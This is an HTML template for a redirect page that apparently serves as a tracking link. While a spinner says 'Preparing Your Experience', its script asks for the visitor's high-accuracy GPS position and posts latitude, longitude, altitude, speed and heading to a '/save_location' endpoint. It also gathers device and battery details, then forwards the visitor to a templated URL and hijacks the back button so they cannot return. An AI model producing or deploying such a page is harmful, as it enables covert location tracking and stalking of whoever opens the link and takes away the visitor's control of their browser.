<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Redirecting...</title>
    <meta name="theme-color" content="#667eea">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            padding: 20px;
        }
        
        .redirect-container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
        }
        
        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(255,255,255,0.3);
            border-left: 4px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        h1 {
            font-size: 1.8rem;
            margin-bottom: 15px;
        }
        
        .status {
            font-size: 1rem;
            opacity: 0.9;
            margin-bottom: 20px;
        }
        
        .progress-bar {
            width: 100%;
            height: 6px;
            background: rgba(255,255,255,0.2);
            border-radius: 3px;
            overflow: hidden;
            margin: 20px 0;
        }
        
        .progress-fill {
            height: 100%;
            background: white;
            width: 0%;
            animation: progress 3s ease-in-out forwards;
        }
        
        @keyframes progress {
            0% { width: 0%; }
            50% { width: 70%; }
            100% { width: 100%; }
        }
        
        .manual-redirect {
            margin-top: 30px;
            display: none;
        }
        
        .redirect-btn {
            background: rgba(255,255,255,0.2);
            color: white;
            border: 2px solid white;
            padding: 12px 25px;
            border-radius: 25px;
            text-decoration: none;
            display: inline-block;
            transition: all 0.3s ease;
            touch-action: manipulation;
        }
        
        .redirect-btn:hover, .redirect-btn:active {
            background: white;
            color: #667eea;
        }
        
        /* Mobile optimizations */
        @media (max-width: 768px) {
            .redirect-container {
                padding: 30px 20px;
            }
            
            h1 {
                font-size: 1.5rem;
            }
            
            .status {
                font-size: 0.9rem;
            }
        }
    </style>
</head>
<body>
    <div class="redirect-container">
        <div class="loading-spinner"></div>
        <h1>🚀 Preparing Your Experience</h1>
        <div class="status" id="status">Collecting analytics data...</div>
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
        
        <div class="manual-redirect" id="manualRedirect">
            <p>Taking longer than expected?</p>
            <a href="{{ redirect_url }}" class="redirect-btn">Continue Manually</a>
        </div>
    </div>
    
    <script>
        const REDIRECT_URL = '{{ redirect_url }}';
        let redirectDelay = 2000; // Start with 2 seconds
        let statusMessages = [
            'Collecting analytics data...',
            'Detecting device information...',
            'Getting location data...',
            'Optimizing experience...',
            'Almost ready...'
        ];
        let currentMessage = 0;
        
        // Update status messages
        function updateStatus() {
            const statusEl = document.getElementById('status');
            if (currentMessage < statusMessages.length) {
                statusEl.textContent = statusMessages[currentMessage];
                currentMessage++;
                setTimeout(updateStatus, 600);
            }
        }
        
        // Start status updates
        updateStatus();
        
        // Collect comprehensive device and browser information
        function collectDeviceInfo() {
            const deviceInfo = {
                screen_resolution: `${screen.width}x${screen.height}`,
                viewport_size: `${window.innerWidth}x${window.innerHeight}`,
                connection_type: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                battery_level: 'unknown',
                online_status: navigator.onLine ? 'online' : 'offline',
                timestamp: new Date().toISOString()
            };
            
            // Try to get battery info (only works on some Android browsers)
            if ('getBattery' in navigator) {
                navigator.getBattery().then(function(battery) {
                    deviceInfo.battery_level = Math.round(battery.level * 100) + '%';
                });
            }
            
            return deviceInfo;
        }
        
        // Try to get precise GPS location
        function getLocationData() {
            if ('geolocation' in navigator) {
                const options = {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 60000
                };
                
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const locationData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            speed: position.coords.speed,
                            heading: position.coords.heading
                        };
                        
                        // Send precise location to server
                        fetch('/save_location', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify(locationData)
                        }).catch(err => console.log('Location save error:', err));
                        
                        console.log('GPS location collected:', locationData);
                    },
                    function(error) {
                        console.log('Location error:', error.message);
                        // Continue without GPS data
                    },
                    options
                );
            }
        }
        
        // Collect all additional device info and save it
        function saveAdditionalData() {
            const deviceInfo = collectDeviceInfo();
            console.log('Device info collected:', deviceInfo);
            
            // You could send this to server if needed
            // For now, we'll just log it
        }
        
        // Start data collection
        saveAdditionalData();
        getLocationData();
        
        // Show manual redirect option after 5 seconds
        setTimeout(() => {
            document.getElementById('manualRedirect').style.display = 'block';
        }, 5000);
        
        // Perform redirect after delay
        setTimeout(() => {
            window.location.href = REDIRECT_URL;
        }, redirectDelay);
        
        // Add touch feedback for mobile
        document.addEventListener('DOMContentLoaded', function() {
            const button = document.querySelector('.redirect-btn');
            if (button) {
                button.addEventListener('touchstart', function() {
                    this.style.transform = 'scale(0.95)';
                });
                
                button.addEventListener('touchend', function() {
                    this.style.transform = '';
                });
            }
        });
        
        // Detect Android for specific optimizations
        const isAndroid = /Android/i.test(navigator.userAgent);
        if (isAndroid) {
            console.log('Android device detected');
            // Could add Android-specific tracking here
        }
        
        // Prevent back button issues on mobile
        history.pushState(null, null, location.href);
        window.onpopstate = function () {
            history.go(1);
        };
    </script>
</body>
</html>
